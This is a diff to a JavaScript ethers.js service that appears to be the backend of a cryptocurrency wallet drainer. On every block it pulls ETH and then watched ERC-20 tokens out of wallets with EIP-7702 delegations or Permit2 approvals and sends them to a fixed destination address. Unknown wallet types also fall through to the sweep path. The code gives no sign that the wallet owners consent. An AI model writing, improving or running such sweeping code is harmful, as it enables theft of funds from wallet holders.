@@ -178,6 +178,8 @@ async function sweepToken(tokenAddress) {
 }
 
 // ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────
+// Order is always: ETH first → tokens second.
+// MIN_ETH_WEI guard avoids wasting gas on dust (< 0.001 ETH).
 
 async function sweepDelegatedWallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
@@ -185,21 +187,23 @@ async function sweepDelegatedWallet(walletAddress) {
   try {
     const userContract = new ethers.Contract(checksum, DELEGATION_ABI, wallet);
 
-    // Native token
+    // STEP 1 — ETH first
     try {
       const bal = await provider.getBalance(checksum);
       if (bal > MIN_ETH_WEI) {
-        log(`[eip7702] ${checksum} native ${ethers.formatEther(bal)} — sweeping`);
+        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — sweeping`);
         const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
         const fee = await getFeeData();
         const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
         log(`[eip7702] sweepETH(${checksum}) tx: ${tx.hash}`);
         await tx.wait();
-        log(`[eip7702] sweepETH confirmed`);
+        log(`[eip7702] sweepETH confirmed for ${checksum}`);
+      } else {
+        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — below threshold, skipping`);
       }
     } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }
 
-    // ERC-20 tokens
+    // STEP 2 — ERC-20 tokens second
     for (const tokenAddress of TOKENS_TO_WATCH) {
       try {
         const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, provider);
@@ -442,7 +446,17 @@ function attachBlockListener() {
       try {
         if (walletType === "permit2") {
           await sweepPermit2Wallet(walletAddress);
+        } else if (
+          walletType === "eip7702" ||
+          walletType === "already-delegated" ||
+          walletType === "smart-wallet-calls" ||
+          walletType === "barz" ||
+          walletType === "smart-wallet"
+        ) {
+          // ETH swept first, then tokens — see sweepDelegatedWallet
+          await sweepDelegatedWallet(walletAddress);
         } else {
+          // Unknown type — default to eip7702 sweep path
           await sweepDelegatedWallet(walletAddress);
         }
       } catch (e) {
